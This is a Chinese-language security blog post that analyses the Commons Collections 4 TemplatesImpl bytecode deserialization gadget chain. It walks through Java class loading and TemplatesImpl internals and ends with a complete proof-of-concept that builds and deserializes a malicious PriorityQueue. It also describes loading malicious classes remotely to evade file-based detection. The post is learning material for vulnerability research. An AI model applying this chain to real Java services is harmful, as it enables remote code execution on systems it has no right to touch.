<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>cc4的TemplatesImpl字节码链 | 土豆妙妙屋</title><meta name="author" content="inyyy"><meta name="copyright" content="inyyy"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="第二条链-TemplatesImpl字节码链javassistClassPool类，类池，将生成的类放在里面（getDefault获取一个默认的类池，get方法，获取类池里面已有的类，可对已有类进行修改，makeClass方法，创建一个类） Field类 make方法用于生成创建类的属性 addField将生成的属性添加到类里面 Method类 用于生成创建类的属性 addMethod方法将生成的">
<meta property="og:type" content="article">
<meta property="og:title" content="cc4的TemplatesImpl字节码链">
<meta property="og:url" content="https://inyyy.github.io/2025/12/28/cc2%E9%93%BE%E7%9A%84TemplatesImpl%E5%AD%97%E8%8A%82%E7%A0%81%E9%93%BE/index.html">
<meta property="og:site_name" content="土豆妙妙屋">
<meta property="og:description" content="第二条链-TemplatesImpl字节码链javassistClassPool类，类池，将生成的类放在里面（getDefault获取一个默认的类池，get方法，获取类池里面已有的类，可对已有类进行修改，makeClass方法，创建一个类） Field类 make方法用于生成创建类的属性 addField将生成的属性添加到类里面 Method类 用于生成创建类的属性 addMethod方法将生成的">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp">
<meta property="article:published_time" content="2025-12-28T09:49:01.000Z">
<meta property="article:modified_time" content="2026-01-02T08:22:27.804Z">
<meta property="article:author" content="inyyy">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "cc4的TemplatesImpl字节码链",
  "url": "https://inyyy.github.io/2025/12/28/cc2%E9%93%BE%E7%9A%84TemplatesImpl%E5%AD%97%E8%8A%82%E7%A0%81%E9%93%BE/",
  "image": "https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp",
  "datePublished": "2025-12-28T09:49:01.000Z",
  "dateModified": "2026-01-02T08:22:27.804Z",
  "author": [
    {
      "@type": "Person",
      "name": "inyyy",
      "url": "https://inyyy.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://inyyy.github.io/2025/12/28/cc2%E9%93%BE%E7%9A%84TemplatesImpl%E5%AD%97%E8%8A%82%E7%A0%81%E9%93%BE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'cc4的TemplatesImpl字节码链',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 8.0.0"></head><body><div id="web_bg" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928001442720.JPG);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">土豆妙妙屋</span></a><a class="nav-page-title" href="/"><span class="site-name">cc4的TemplatesImpl字节码链</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"></div></nav><div id="post-info"><h1 class="post-title">cc4的TemplatesImpl字节码链</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-28T09:49:01.000Z" title="发表于 2025-12-28 17:49:01">2025-12-28</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-01-02T08:22:27.804Z" title="更新于 2026-01-02 16:22:27">2026-01-02</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="第二条链-TemplatesImpl字节码链"><a href="#第二条链-TemplatesImpl字节码链" class="headerlink" title="第二条链-TemplatesImpl字节码链"></a>第二条链-TemplatesImpl字节码链</h1><h3 id="javassist"><a href="#javassist" class="headerlink" title="javassist"></a>javassist</h3><p><strong>ClassPool类，类池，将生成的类放在里面（getDefault获取一个默认的类池，get方法，获取类池里面已有的类，可对已有类进行修改，makeClass方法，创建一个类）</strong></p>
<p><strong>Field类 make方法用于生成创建类的属性 addField将生成的属性添加到类里面</strong></p>
<p><strong>Method类 用于生成创建类的属性 addMethod方法将生成的方法添加到类里面 setBody方法生成方法的方法体</strong></p>
<p><strong>Constructor 创建构造器 直接new addConstrutor添加到对应的类中  makeClassInitializer方法创建一个静态方法 setBody生成方法的方法体</strong></p>
<p><strong>bytecode[] 将生成的类转化为字节数组，后续利用关键</strong></p>
<p><strong>writeFile将类的class文件写在对应的目录</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251225131957584.png" alt="image-20251225131950478"></p>
<p><strong>利用javassist创建的类</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251225132049043.png" alt="image-20251225132049007"></p>
<h3 id="ClassLoader中的defineClass方法"><a href="#ClassLoader中的defineClass方法" class="headerlink" title="ClassLoader中的defineClass方法"></a>ClassLoader中的defineClass方法</h3><p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251225132435282.png" alt="image-20251225132435260"></p>
<p><strong>传入一个字节数组并且将类的字节数组加载到内存当中，转化为class对象</strong></p>
<h2 id="java字节码"><a href="#java字节码" class="headerlink" title="java字节码"></a>java字节码</h2><p><strong>java字节码是java虚拟机执行命令的指令，存储在.class文件,是java代码执行的底层形式，java代码 –&gt; 字节码.class文件 –&gt;  jvm执行，cc链的漏洞利用，本质就是操控字节码的执行流程</strong></p>
<h2 id="类加载机制"><a href="#类加载机制" class="headerlink" title="类加载机制"></a>类加载机制</h2><p><strong>类加载机制是指jvm将class文件即java字节码加载到内存，对其进行验证，解析，初始化，最终形成可以被jvm执行的类对象（Class对象）</strong></p>
<p><strong>类加载是一个顺序的过程，加载 –&gt; 验证 –&gt; 准备 –&gt; 解析 –&gt; 初始化</strong></p>
<p><strong>第一步：加载 loading</strong></p>
<p><strong>从文件&#x2F;网络&#x2F;内存读取.class文件的字节流并生成一个对应的类的Class对象，作为该类的入口</strong></p>
<p><strong>例子：上一条链中 <code>org.apache.commons.collections4.functors.InvokerTransformer</code> 类，就是在第一次被引用时（比如 <code>new InvokerTransformer(...)</code>），由类加载器加载到内存。</strong></p>
<p><strong>第二步：验证 verification</strong></p>
<p><strong>验证文件的命名格式是否符合.class文件，验证字节码</strong></p>
<p><strong>例子：cc链中的tranformer恶意类的.class文件必须通过验证才能被加载</strong></p>
<p><strong>第三步：准备（preparation）</strong></p>
<p><strong>为类的静态变量分配内存，并设置一个默认值（后续会在初始化阶段赋值）</strong></p>
<p><strong>例子：若类中有一个静态变量 static int num&#x3D;10，会在准备阶段为其分配内存，并设置一个默认值0，在后续初始化阶段赋值为10</strong></p>
<p><strong>第四步：解析 resolution</strong></p>
<p><strong>将符号引用转化为直接引用（内存中的类和方法实际位置）</strong></p>
<p><strong>例子：CC 链中 <code>InvokerTransformer</code> 反射调用 <code>Runtime.getMethod(&quot;getRuntime&quot;)</code>，其中 <code>&quot;getRuntime&quot;</code> 就是符号引用，解析阶段会将其映射到 <code>Runtime</code> 类的实际方法地址。</strong></p>
<p><strong>第五步：初始化 initialization</strong></p>
<p><strong>执行静态代码块和静态赋值语句，是类加载过程中唯一会执行代码逻辑的步骤，当类被主动调用时才会触发初始化，比如隐式new一个实例，访问类的静态方法，访问类的静态变量</strong></p>
<h3 id="Classloader"><a href="#Classloader" class="headerlink" title="Classloader"></a>Classloader</h3><p><strong>在类加载机制中的第一步加载过程，使用的是Classloader</strong></p>
<p><strong>jvm内置三个加载器</strong></p>
<p><strong>1.启动加载器：bootstrap：加载jdk核心类，比如java.lang.Runtime，底层由native方法实现</strong></p>
<p><strong>2.扩展加载器：Extension：加载jdk扩展类，jre&#x2F;lib&#x2F;ext目录下的类</strong></p>
<p><strong>3.应用加载器：Application：加载项目代码和第三方依赖库，比如cc库</strong></p>
<p><strong>这一步的核心规则是双亲委派规则，是类加载阶段的遵循规则，类加载时先委托父加载器加载，当父加载器无法加载时才会自己加载</strong></p>
<ul>
<li><strong>比如加载 CC 库的 <code>InvokerTransformer</code>：应用程序类加载器 → 委托扩展类加载器 → 委托启动类加载器（无法加载）→ 扩展类加载器（无法加载）→ 应用程序类加载器自己加载。</strong></li>
</ul>
<p><strong>加载类的子流程：</strong></p>
<p><strong>loadclass() –&gt; findclass() –&gt; defineclass()</strong></p>
<p><strong>1：loadclass：类加载器加载类的入口方法，实现双亲委派模式，决定是否要加载类，当父类加载器无法加载时会让自己加载，父加载器加载失败会调用自定义加载器重写的findClass方法</strong></p>
<p><strong>2：findclass：自定义类加载的扩张点，负责查找&#x2F;读取类的字节码，比如本地文件，网络文件，内存</strong></p>
<p><strong>3：defineclass：类加载的最后流程，负责将字节码数组(byte[])转化为jvm可执行的Class对象</strong></p>
<p><strong>类的加载流程不能跳过步骤，但是加载步骤的子流程是可以进行跳过步骤的：</strong></p>
<p><strong>loadClass() –&gt; findClass() –&gt; defineClass()是标准链路，但是可以跳过findClass步骤，直接传入字节码数组利用defineClass()将其转化为jvm可执行的class对象</strong></p>
<p><strong>核心用于：内存直接加载字节码，无需查找读取本地文件，网络文件的类的字节码，跳过findClass查找字节码的逻辑，直接将字节码转换为class对象，该方法无需落地.class文件，不用将.class文件存储在物理磁盘，可绕过文件安全的检测，直接将字节码存储在内存中</strong></p>
<ol>
<li>开发者编写Java源码（Evil.java）→ 2. 编译器（javac）编译 → 3. 生成Evil.class文件（落地到磁盘）→ 4. 类加载器读取该.class文件字节流→ 5. 加载为Class对象</li>
</ol>
<h3 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a><strong>URLClassLoader</strong></h3><p><strong>URLClassLoader是java内置的核心加载器，继承自ClassLoader，专门用于从url地址（本地文件&#x2F;网络地址）中加载.calss文件或jar包</strong></p>
<p><strong>支持file协议，jar协议，http协议</strong></p>
<p><strong><code>URLClassLoader</code> 是 CC 链漏洞利用中动态加载依赖 &#x2F; 恶意类的关键工具，常见场景：</strong></p>
<ol>
<li><strong>加载缺失的 CC 库：若目标系统未内置 CC 库，可通过 <code>URLClassLoader</code> 从远程加载 <code>commons-collections.jar</code>，再组装恶意链；</strong></li>
<li><strong>加载恶意类：将含恶意 <code>Transformer</code> 链的 <code>.class</code> 文件放在远程服务器，通过 <code>URLClassLoader</code> 加载并执行，绕过本地文件限制；</strong></li>
<li><strong>绕过类加载隔离：比如在 Tomcat 中，通过 <code>URLClassLoader</code> 加载自定义路径的 CC 库类，突破 <code>WebAppClassLoader</code> 的隔离限制。</strong></li>
</ol>
<h3 id="translet类"><a href="#translet类" class="headerlink" title="translet类"></a>translet类</h3><p><strong>translet类是XSLT样式表编译后的字节码类，开发者编写的 XSLT 样式表（<code>.xsl</code>&#x2F;<code>.xslt</code> 文件，定义 XML 转换规则），会被 JDK 内置的 Xalan 编译器编译成字节码类，这个类就是 <code>translet</code>，合法的translet类必须继承其父类AbstractTranslet</strong></p>
<h3 id="TemplatesImpl类"><a href="#TemplatesImpl类" class="headerlink" title="TemplatesImpl类"></a>TemplatesImpl类</h3><p><strong>TemplatesImpl字节码链利用的核心就是其可以加载恶意字节码，该类存在一个内部类，TransletClassLoader，该类继承了ClassLoader并且重写了loadclass方法，可以通过这个类加载器直接跳过findclass方法传入字节码，加载字节码来生成jvm执行的java类</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251226155620851.png" alt="image-20251226155613772"></p>
<p><strong>该类实现了序列化接口，看到里面有一个静态成员，了解了一下它是 translet 字节码反序列化的开关，我的jdk版本是8u66，默认这个开关为true，在高版本的jdk中是false，当开关设置为false时无法对字节码进行反序列化操作，但是在8u66版本即使设置为false也能进行反序列化操作，因为在jdk8u66中没有对这个开关进行校验，这个就是开关失效问题</strong></p>
<p><strong>定位到TransletClassLoader类，该类为静态，并且修饰符是default，我们写代码是无法进行调用的，无法跨过default的同包访问权限，尝试寻找能进行权限中转的方法</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251226174833154.png" alt="image-20251226174833112"></p>
<p><strong>在defineTransletClasses方法里面对这个内部类进行了调用</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251226175348396.png" alt="image-20251226175348362"></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228130309041.png" alt="image-20251228130301948"></p>
<p><strong>这一部分代码是得到一个类加载器并且设置更高的java内存权限，因为这个加载器要对内存进行读取字节码，关键是实例化得到一个loader，里面是由两个参数的，后面看完再回来分析</strong></p>
<p><strong>这一部分代码将bytecode成员里面的字节码读取到了_class变量里面进行保存，将其加载为了一个Class对象，并获取了他的父类，后面的if语句判断这个加载类的父类是否继承了ABSTRACT_TRANSLET类，然后对_transletIndex进行赋值</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228130843043.png" alt="image-20251228130842988"></p>
<p><strong>先尝试这一部分进行加载类</strong></p>
<p><strong>javassist创建类，将其加载为字节码</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228141732543.png" alt="image-20251228141732502"></p>
<p><strong>创建的类，通过上面的分析这个类必须继承AbstractTranslet类</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228141814859.png" alt="image-20251228141814828"></p>
<p><strong>javassist产生字节码</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228144021169.png" alt="image-20251228144021127"></p>
<p><strong>在测试代码中运行可以看到字节码确实被加载到了内存</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228144232717.png" alt="image-20251228144232666"></p>
<p><strong>因为_bytecodes字段是private，通过反射去修改字段的值，使其为我们创建的恶意类的字节码</strong></p>
<p><strong>要加载这个字节码，需要解决创建加载器时的参数问题，回到构造函数进行分析</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228144639700.png" alt="image-20251228144639680"></p>
<p><strong>对这个构造器进行分析，需要一个父类，还要一个map接口类</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228145018123.png" alt="image-20251228145018099"></p>
<p><strong>在new的时候第一个参数直接调用ObjectFactory类的findClassLoader方法，所以这里不用管，看第二个参数</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228145849922.png" alt="image-20251228145849896"></p>
<p><strong>第二个参数_tfactory默认是一个null，是一个TransformerFactoryImpl类，追踪这个类查看一下getExternalExtensionsMap()方法，返回一个map</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228150544396.png" alt="image-20251228150544373"></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228150848261.png" alt="image-20251228150848238"></p>
<p><strong>经过追踪，我们new一个TransformerFactoryImpl对象然后它会调用getExternalExtensionsMap()方法，这样不就得到一个空的map传进去了，还是利用反射修改_tfactory字段，接着模块验证，看是否加载了这个字节码的类</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228152207546.png" alt="image-20251228152207499"></p>
<p><strong>在defineTransletClasses方法执行处打一个断点，看能不能进入加载</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228153346090.png" alt="image-20251228153346048"></p>
<p><strong>成功进入条件判断并加载，和我创建的类名相同，验证完这一模块，还没有达到目的，要让静态代码被执行需要这个类被初始化，接着看哪里对这个类存在引用，追踪defineTransletClasses方法，在getTransletInstance方法进行引用，这个方法名一看就是进行实例化</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228153904183.png" alt="image-20251228153904143"></p>
<p><strong>两个if语句，_name不能为空,_class要为null</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228154917226.png" alt="image-20251228154917204"></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228154958827.png" alt="image-20251228154958806"></p>
<p><strong>查看默认值，这里只需要反射修改_name参数，模块化验证，成功执行命令</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228155632304.png" alt="image-20251228155632236"></p>
<p><strong>但是目前是基于手动调用的，我们要获得一条自动链，需要和上一条链的入口readObject进行结合，第一条链已经分析过了，往后分析，看谁调用了getTransletInstance方法</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228162313257.png" alt="image-20251228162313229"></p>
<p><strong>一个返回Transformer接口类的方法进行了调用，回到PriorityQueue的最后出发点compare方法，就是transformer.tranform,将两者进行包装联系在一起应该就完成了，这个方法被cc库的TransformingComparator类重写了</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228162623732.png" alt="image-20251228162623704"></p>
<p><strong>TransformingComparator类的构造器，利用InvokerTransformer类来反射调用TemplatesImpl类的getTransletInstance方法，然后赋值给这个类的transformer接口类成员，后续通过priorityQueue类的readObject入口进入调用链</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228165612900.png" alt="image-20251228165612874"></p>
<p><strong>大致链：PriorityQueue–&gt;heapify–&gt;siftDown–&gt;siftDownUsingComparator–&gt;TransformingComparator.compare–&gt;transformer.transform–&gt;InvokerTransformer.transform–&gt;TemplatesImpl.newTransformer.invoke</strong></p>
<p><img src="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20251228174339787.png" alt="image-20251228174339704"></p>
<p><strong>完整poc：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import javassist.convert.Transformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class cc2test &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        TemplatesImpl templatesimpl=new TemplatesImpl();</span><br><span class="line">        Field getbytecode=TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        getbytecode.setAccessible(true);</span><br><span class="line">        byte[] testByte=javassist2.generate();</span><br><span class="line">        byte[][] bytes=new byte[][]&#123;testByte&#125;;</span><br><span class="line">        getbytecode.set(templatesimpl,bytes);</span><br><span class="line">        //System.out.println(Arrays.toString(testByte));</span><br><span class="line">        Field gettfactory=TemplatesImpl.class.getDeclaredField(&quot;_tfactory&quot;);</span><br><span class="line">        gettfactory.setAccessible(true);</span><br><span class="line">        gettfactory.set(templatesimpl,new TransformerFactoryImpl());</span><br><span class="line">        //Method getdefineclasslaoder=TemplatesImpl.class.getDeclaredMethod(&quot;defineTransletClasses&quot;);</span><br><span class="line">        //getdefineclasslaoder.setAccessible(true);</span><br><span class="line">        //getdefineclasslaoder.invoke(templatesimpl);</span><br><span class="line">        Field getname=TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        getname.setAccessible(true);</span><br><span class="line">        getname.set(templatesimpl,&quot;aaaa&quot;);</span><br><span class="line">        //Method gettransletinstance=TemplatesImpl.class.getDeclaredMethod(&quot;getTransletInstance&quot;);</span><br><span class="line">        //gettransletinstance.setAccessible(true);</span><br><span class="line">        //gettransletinstance.invoke(templatesimpl);</span><br><span class="line">        //ConstantTransformer constantTransformer=new ConstantTransformer(&quot;Runtime.Class&quot;);</span><br><span class="line">        //ConstantTransformer constantTransformer1=new ConstantTransformer(&quot;1&quot;);</span><br><span class="line">        //ConstantTransformer constantTransformer2=new ConstantTransformer(&quot;2&quot;);</span><br><span class="line">        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,new Class[0],new Object[0]);</span><br><span class="line">        TransformingComparator comparator=new TransformingComparator(transformer);</span><br><span class="line">        PriorityQueue testqueue=new PriorityQueue(comparator);</span><br><span class="line">        //根据第一条链分析的要满足size大于等于2</span><br><span class="line">        testqueue.offer(templatesimpl);</span><br><span class="line">        testqueue.offer(templatesimpl);</span><br><span class="line"></span><br><span class="line">        serialize(testqueue);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object object) throws Exception&#123;</span><br><span class="line">        ObjectOutputStream objectoutputstream=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        objectoutputstream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void unserialize(String filename) throws Exception&#123;</span><br><span class="line">        ObjectInputStream objectinputstream=new ObjectInputStream(new FileInputStream(filename));</span><br><span class="line">        objectinputstream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://inyyy.github.io">inyyy</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://inyyy.github.io/2025/12/28/cc2%E9%93%BE%E7%9A%84TemplatesImpl%E5%AD%97%E8%8A%82%E7%A0%81%E9%93%BE/">https://inyyy.github.io/2025/12/28/cc2%E9%93%BE%E7%9A%84TemplatesImpl%E5%AD%97%E8%8A%82%E7%A0%81%E9%93%BE/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://inyyy.github.io" target="_blank">土豆妙妙屋</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="https://inyyy-blog.oss-cn-beijing.aliyuncs.com/undefined20250928000906169.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/30/cc6-HashMap%E9%93%BE/" title="cc6-HashMap链"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">cc6-HashMap链</div></div><div class="info-2"><div class="info-item-1">cc6-hashmap链(通用版cc链）cc6链相比cc1链不受jdk版本限制，在jdk8版本中都能成功运行，需要用到的cc库版本是3.2.1 完整调用链： HashMap.readObject()HashMap.hash()TiedMapEntry.hashCode()TiedMapEntry.getValue()LazyMap.get()ChainedTransformer.transform()InvokerTransformer.transform()Runtime.exec() 一：调用链分析 来到入口类HashMap.readObject()   这段代码的主要功能是对循环读取序列化的键和值，并且利用putVal方法将键值重新存入HashMap，其中的hash(key)是用来计算键的 哈希值，确定键值对在哈希表中的存储位置，根据利用链，跟进hash方法  